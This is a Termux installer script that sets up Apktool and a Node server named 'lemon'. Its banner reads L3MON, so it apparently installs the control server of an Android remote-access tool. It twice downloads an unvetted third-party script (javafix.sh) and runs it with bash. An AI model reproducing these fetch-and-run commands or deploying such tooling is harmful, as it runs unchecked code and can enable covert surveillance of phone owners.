#!/data/data/com.termux/files/usr/bin/sh


apt update && apt upgrade -y
pkg install python-pip toilet -y
pip install lolcat -y
pkg install proot wget && wget https://github.com/h4ck3r0/Java-termux/releases/download/javafix.sh/javafix.sh && bash javafix.sh

clear

echo '

   ██      ██████  ███    ███  ██████  ███    ██ 
   ██           ██ ████  ████ ██    ██ ████   ██ 
   ██       █████  ██ ████ ██ ██    ██ ██ ██  ██ 
   ██           ██ ██  ██  ██ ██    ██ ██  ██ ██ 
   ███████ ██████  ██      ██  ██████  ██   ████ 
                                   github.com/Andr3oix
                           
' | lolcat                           
 echo -e "\e[1;31m [\e[32m√\e[31m] \e[1;91m by \e[1;36mMOHAMMED \e[93m/ \e[100;92m Youtube.com/@Andr3oix\e[0m"
 echo -e "\e[34m[\e[92m✓\e[34m]\033[92m INSTALLING REQUIREED PACKAGES"
 sleep 6.0
 apt install nodejs nano yarn -y
 clear
                 
                  toilet -F border -f mono12  "Apktool"  | lolcat
                  printf ""
                  printf "\e[1;34m[*] \e[1;96mcreated by \e[1;33m MOHAMMED ( @Andr3oix )\e[0m"
              
                  
export apktool_version=2.6.1

sh -c 'wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_$apktool_version.jar -O $PREFIX/bin/apktool.jar'

chmod +r $PREFIX/bin/apktool.jar

sh -c 'wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O $PREFIX/bin/apktool' && chmod +x $PREFIX/bin/apktool
cd /data/data/com.termux/files/usr/share/
mkdir lemon 
cd $HOME/Lemon-termux/.files
pkg install wget && wget https://github.com/h4ck3r0/Java-termux/releases/download/javafix.sh/javafix.sh && bash javafix.sh
cp -r app assets clientData includes index.js package-lock.json package.json /data/data/com.termux/files/usr/share/lemon/
sed -i 'ccd $PREFIX/share/lemon/ && node index.js' $HOME/Lemon-termux/lemon
cp -r $HOME/Lemon-termux/lemon /data/data/com.termux/files/usr/bin/
chmod +x /data/data/com.termux/files/usr/bin/lemon

cd /data/data/com.termux/files/usr/share/lemon/
yarn add expressjs
clear
echo -e "\e[34mINSTALLED SUCCESSFULLY....[\e[92m✓\e[34m]\e[92m"
echo -e "\e[34mTHANKS TO D3VL[\e[92m✓\e[34m]\e[92m"
sleep 5.0
clear
echo -e "\e[1;34m[√] \e[96mType Lemon To Start Server\e[0m"




